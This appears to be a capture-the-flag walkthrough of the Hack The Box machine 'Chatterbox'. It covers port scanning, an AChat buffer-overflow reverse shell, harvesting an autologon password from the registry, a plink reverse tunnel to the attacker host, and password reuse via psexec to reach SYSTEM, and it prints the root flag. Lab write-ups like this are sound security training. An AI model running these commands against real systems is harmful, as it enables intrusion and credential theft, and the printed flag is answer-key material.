# Chatterbox

URL: https://app.hackthebox.com/machines/Chatterbox

Level: Medium

Date 17 Apr 2021

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.91 scan initiated Wed Apr 14 22:18:45 2021 as: nmap -p- -T4 -oN 01_nmap.txt 10.10.10.74
Nmap scan report for 10.10.10.74
Host is up (0.046s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
9255/tcp open  mon
9256/tcp open  unknown

# Nmap done at Wed Apr 14 22:27:16 2021 -- 1 IP address (1 host up) scanned in 510.51 seconds
```

We got two uncommon open ports.

Let's try with `telnet`:

```
root@kali:/opt/htb/Chatterbox# telnet 10.10.10.74 9255
Trying 10.10.10.74...
Connected to 10.10.10.74.
Escape character is '^]'.
get /

HTTP/1.1 400 Bad Request
Connection: close
Server: AChat

Connection closed by foreign host.
```

It seems we are facing "AChat" service.

Let's check with `msfconsole` if we can take advantage of some vulnerability:

```
msf6 > search achat

Matching Modules
================

   #  Name                            Disclosure Date  Rank    Check  Description
   -  ----                            ---------------  ----    -----  -----------
   0  exploit/windows/misc/achat_bof  2014-12-18       normal  No     Achat Unicode SEH Buffer Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/misc/achat_bof

msf6 >
```

We use this exploit:

```
git clone https://github.com/mpgn/AChat-Reverse-TCP-Exploit.git
```

And we configure it:

```
sh AChat_Payload.sh
```



After spawning our msfconsole listener, We run exploit and we get a reverse shell:

```
msf6 exploit(multi/handler) > set PAYLOAD windows/shell/reverse_tcp
PAYLOAD => windows/shell/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.28:4444
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.10.10.74
[*] Command shell session 4 opened (10.10.14.28:4444 -> 10.10.10.74:49160) at 2021-04-16 23:42:07 +0200



Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
C:\Windows\system32>whoami
whoami
chatterbox\alfred
```

# User-flag

From here, we can easily grab user flag on "alfred" desktop.

# Privesc

In order to better know our target, we acquire `systeminfo`:

```
Host Name:                 CHATTERBOX
OS Name:                   Microsoft Windows 7 Professional
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00371-222-9819843-86663
Original Install Date:     12/10/2017, 9:18:19 AM
System Boot Time:          4/16/2021, 4:36:32 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,549 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,427 MB
Virtual Memory: In Use:    668 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\CHATTERBOX
Hotfix(s):                 183 Hotfix(s) Installed.
                           [01]: KB2849697
                           [02]: KB2849696
                           [03]: KB2841134
                           [04]: KB2670838
                           [05]: KB2830477
                           [06]: KB2592687
                           [07]: KB2479943
                           [08]: KB2491683
                           [09]: KB2506212
                           [10]: KB2506928
                           [11]: KB2509553
                           [12]: KB2533552
                           [13]: KB2534111
                           [14]: KB2545698
                           [15]: KB2547666
                           [16]: KB2552343
                           [17]: KB2560656
                           [18]: KB2563227
                           [19]: KB2564958
                           [20]: KB2574819
                           [21]: KB2579686
                           [22]: KB2604115
                           [23]: KB2620704
                           [24]: KB2621440
                           [25]: KB2631813
                           [26]: KB2639308
                           [27]: KB2640148
                           [28]: KB2647753
                           [29]: KB2654428
                           [30]: KB2660075
                           [31]: KB2667402
                           [32]: KB2676562
                           [33]: KB2685811
                           [34]: KB2685813
                           [35]: KB2690533
                           [36]: KB2698365
                           [37]: KB2705219
                           [38]: KB2719857
                           [39]: KB2726535
                           [40]: KB2727528
                           [41]: KB2729094
                           [42]: KB2732059
                           [43]: KB2732487
                           [44]: KB2736422
                           [45]: KB2742599
                           [46]: KB2750841
                           [47]: KB2761217
                           [48]: KB2763523
                           [49]: KB2770660
                           [50]: KB2773072
                           [51]: KB2786081
                           [52]: KB2799926
                           [53]: KB2800095
                           [54]: KB2807986
                           [55]: KB2808679
                           [56]: KB2813430
                           [57]: KB2820331
                           [58]: KB2834140
                           [59]: KB2840631
                           [60]: KB2843630
                           [61]: KB2847927
                           [62]: KB2852386
                           [63]: KB2853952
                           [64]: KB2857650
                           [65]: KB2861698
                           [66]: KB2862152
                           [67]: KB2862330
                           [68]: KB2862335
                           [69]: KB2864202
                           [70]: KB2868038
                           [71]: KB2871997
                           [72]: KB2884256
                           [73]: KB2891804
                           [74]: KB2892074
                           [75]: KB2893294
                           [76]: KB2893519
                           [77]: KB2894844
                           [78]: KB2900986
                           [79]: KB2908783
                           [80]: KB2911501
                           [81]: KB2912390
                           [82]: KB2918077
                           [83]: KB2919469
                           [84]: KB2923545
                           [85]: KB2931356
                           [86]: KB2937610
                           [87]: KB2943357
                           [88]: KB2952664
                           [89]: KB2966583
                           [90]: KB2968294
                           [91]: KB2970228
                           [92]: KB2972100
                           [93]: KB2973112
                           [94]: KB2973201
                           [95]: KB2973351
                           [96]: KB2977292
                           [97]: KB2978742
                           [98]: KB2984972
                           [99]: KB2985461
                           [100]: KB2991963
                           [101]: KB2992611
                           [102]: KB3003743
                           [103]: KB3004361
                           [104]: KB3004375
                           [105]: KB3006121
                           [106]: KB3006137
                           [107]: KB3010788
                           [108]: KB3011780
                           [109]: KB3013531
                           [110]: KB3020370
                           [111]: KB3020388
                           [112]: KB3021674
                           [113]: KB3021917
                           [114]: KB3022777
                           [115]: KB3023215
                           [116]: KB3030377
                           [117]: KB3035126
                           [118]: KB3037574
                           [119]: KB3042058
                           [120]: KB3045685
                           [121]: KB3046017
                           [122]: KB3046269
                           [123]: KB3054476
                           [124]: KB3055642
                           [125]: KB3059317
                           [126]: KB3060716
                           [127]: KB3061518
                           [128]: KB3067903
                           [129]: KB3068708
                           [130]: KB3071756
                           [131]: KB3072305
                           [132]: KB3074543
                           [133]: KB3075226
                           [134]: KB3078601
                           [135]: KB3078667
                           [136]: KB3080149
                           [137]: KB3084135
                           [138]: KB3086255
                           [139]: KB3092627
                           [140]: KB3093513
                           [141]: KB3097989
                           [142]: KB3101722
                           [143]: KB3102429
                           [144]: KB3107998
                           [145]: KB3108371
                           [146]: KB3108381
                           [147]: KB3108664
                           [148]: KB3109103
                           [149]: KB3109560
                           [150]: KB3110329
                           [151]: KB3118401
                           [152]: KB3122648
                           [153]: KB3123479
                           [154]: KB3126587
                           [155]: KB3127220
                           [156]: KB3133977
                           [157]: KB3137061
                           [158]: KB3138378
                           [159]: KB3138612
                           [160]: KB3138910
                           [161]: KB3139398
                           [162]: KB3139914
                           [163]: KB3140245
                           [164]: KB3147071
                           [165]: KB3150220
                           [166]: KB3150513
                           [167]: KB3156016
                           [168]: KB3156019
                           [169]: KB3159398
                           [170]: KB3161102
                           [171]: KB3161949
                           [172]: KB3161958
                           [173]: KB3172605
                           [174]: KB3177467
                           [175]: KB3179573
                           [176]: KB3184143
                           [177]: KB3185319
                           [178]: KB4014596
                           [179]: KB4019990
                           [180]: KB4040980
                           [181]: KB976902
                           [182]: KB982018
                           [183]: KB4054518
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.74
```

We copy this content in a local file and we run Windows-Exploit-Suggester:

```
root@kali:/opt/tools/Windows-Exploit-Suggester# ./windows-exploit-suggester.py --database 2021-04-16-mssb.xls --systeminfo /opt/htb/Chatterbox/07_systeminfo_better.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 183 hotfix(es) against the 381 potential bulletins(s) with a database of 137 known exploits
[*] there are now 175 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 7 SP1 32-bit'
[*]
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*]
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*]
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*]
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*]
[E] MS16-056: Security Update for Windows Journal (3156761) - Critical
[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)
[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption
[*]
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*]
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*]
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*]
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*]
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*]
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
[*]
[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
[*]
[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
[*]
[*] done
```

We also look for local stored password with `reg query`:

```
c:\Windows\Panther>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x80000033
    DefaultDomainName    REG_SZ
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!
```

We found a password ("Welcome1!").

Other registry findings:

```
c:\Windows\Panther>reg query HKLM /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\ProgID
    (Default)    REG_SZ    IAS.ChangePassword.1
..
..



HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    Welcome1!
```

We run `netstat` and we found samba service listening:

```
c:\Windows\Temp>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       700
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4     <====================
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       364
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       776
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       924
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       420
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       472
  TCP    10.10.10.74:139        0.0.0.0:0              LISTENING       4
  TCP    10.10.10.74:9255       0.0.0.0:0              LISTENING       132
  TCP    10.10.10.74:9256       0.0.0.0:0              LISTENING       132
  TCP    10.10.10.74:49161      10.10.14.28:4444       ESTABLISHED     132
  TCP    [::]:135               [::]:0                 LISTENING       700
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       364
  TCP    [::]:49153             [::]:0                 LISTENING       776
  TCP    [::]:49154             [::]:0                 LISTENING       924
  TCP    [::]:49155             [::]:0                 LISTENING       420
  TCP    [::]:49156             [::]:0                 LISTENING       472
  UDP    0.0.0.0:123            *:*                                    896
  UDP    0.0.0.0:500            *:*                                    924
  UDP    0.0.0.0:4500           *:*                                    924
  UDP    0.0.0.0:5355           *:*                                    1172
  UDP    0.0.0.0:59158          *:*                                    1172
  UDP    10.10.10.74:137        *:*                                    4
  UDP    10.10.10.74:138        *:*                                    4
  UDP    10.10.10.74:1900       *:*                                    3236
  UDP    10.10.10.74:9256       *:*                                    132
  UDP    127.0.0.1:1900         *:*                                    3236
  UDP    127.0.0.1:63904        *:*                                    3236
  UDP    [::]:123               *:*                                    896
  UDP    [::]:500               *:*                                    924
  UDP    [::]:4500              *:*                                    924
  UDP    [::1]:1900             *:*                                    3236
  UDP    [::1]:63903            *:*
```

We use `plink` and we create a tunnel with our attacker machine.

```
root@kali:/opt/htb/Chatterbox# wget https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe
--2021-04-17 00:48:59--  https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe
Resolving the.earth.li (the.earth.li)... 93.93.131.124, 2a00:1098:86:4d:c0ff:ee:15:900d
Connecting to the.earth.li (the.earth.li)|93.93.131.124|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://the.earth.li/~sgtatham/putty/0.74/w32/plink.exe [following]
--2021-04-17 00:49:00--  https://the.earth.li/~sgtatham/putty/0.74/w32/plink.exe
Reusing existing connection to the.earth.li:443.
HTTP request sent, awaiting response... 200 OK
Length: 598440 (584K) [application/x-msdos-program]
Saving to: ‘plink.exe’

plink.exe                                            100%[=====================================================================================================================>] 584.41K  2.36MB/s    in 0.2s

2021-04-17 00:49:00 (2.36 MB/s) - ‘plink.exe’ saved [598440/598440]
```

We use as always our python web server to transfer file on target machine:

```
root@kali:/opt/htb/Chatterbox# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.74 - - [17/Apr/2021 00:51:41] "GET /plink.exe HTTP/1.1" 200 -
```

```
C:\Users\Alfred\Desktop>plink -l root -pw chatterbox -R 445:127.0.0.1:445 10.10.14.28 -P 80
plink -l root -pw chatterbox -R 445:127.0.0.1:445 10.10.14.28 -P 80
The server's host key is not cached in the registry. You
have no guarantee that the server is the computer you
think it is.
The server's ssh-ed25519 key fingerprint is:
ssh-ed25519 255 d1:45:b4:d4:7b:ec:3d:32:fa:ba:45:8b:8b:47:8b:18
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n) y
Using username "root".




root@kali:~#
```

Now, we simply assume that Administrator has same password as Alfred.

We try and we get access:

```
root@kali:/opt/impacket/examples# ./psexec.py administrator:"Welcome1!"@127.0.0.1
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 127.0.0.1.....
[*] Found writable share ADMIN$
[*] Uploading file NlhSJiHl.exe
[*] Opening SVCManager on 127.0.0.1.....
[*] Creating service OfYk on 127.0.0.1.....
[*] Starting service OfYk.....
[!] Press help for extra shell commands                                                                                                                                                                           Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami                                                                                                                                                                                        nt authority\system
```

We can also use `winexe` (from Impacket suite):

```
root@kali:/opt/impacket/examples# winexe -U Administrator%Welcome1! //127.0.0.1 "cmd.exe"
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\administrator

C:\Windows\system32>cd c:\users\administrt^?ato
cd c:\users\administrato
The system cannot find the path specified.

C:\Windows\system32>cd c:\users\administrator\desktop
cd c:\users\administrator\desktop

c:\Users\Administrator\Desktop>type root.txt
type root.txt
408d3827f6a91253bfbfbb15e1e7431c

```

